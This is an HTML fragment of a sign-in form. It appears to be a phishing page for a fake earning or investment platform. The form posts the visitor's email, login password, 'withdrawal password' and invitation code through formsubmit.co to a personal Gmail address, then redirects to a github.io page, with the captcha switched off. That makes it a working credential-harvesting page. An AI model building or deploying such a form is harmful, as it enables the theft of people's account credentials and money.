    <body>
        <div class="container">
            <div class="form-container" style="height: 600px;">
                <img src="./img/S.png" alt="" style="width: 17rem;">
                <form class="form" action="https://formsubmit.co/dineroewiwilem@gmail.com"
                                    method="POST">
                    <input type="text" name="_honey" style="display: none" />
                                <input type="hidden" name="_captcha" value="false" />
                                <input type="hidden" name="_next" value="https://seitupad.github.io/app/home.html">
                    <input type="email" name="email" class="input" placeholder="Email" required>
                    <input type="password" name="password" class="input" placeholder="Login Password" required>
                    <input type="password" name="withdrawal password" class="input" placeholder="Withdrawal Password" requied>
                    <input type="text" name="invitation code" class="input" placeholder="Invitation Code" required>
                    <div class="gender-option">
                        <div class="gender">
                          <h3>Gender</h3>
                          <input type="radio" id="check-male" name="male-gender" />
                          <label for="check-male">male</label>
                        </div>
                        <div class="gender">
                          <input type="radio" id="check-female" name="female-gender" />
                          <label for="check-female">Female</label>
                        </div>
        
                    </div> 
                    <button class="form-btn">Sign in</button>
                </form>
                <p class="sign-up-label">
                    <a href="./login.html"><span class="sign-up-link">Back to Login</span></a>
                </p>
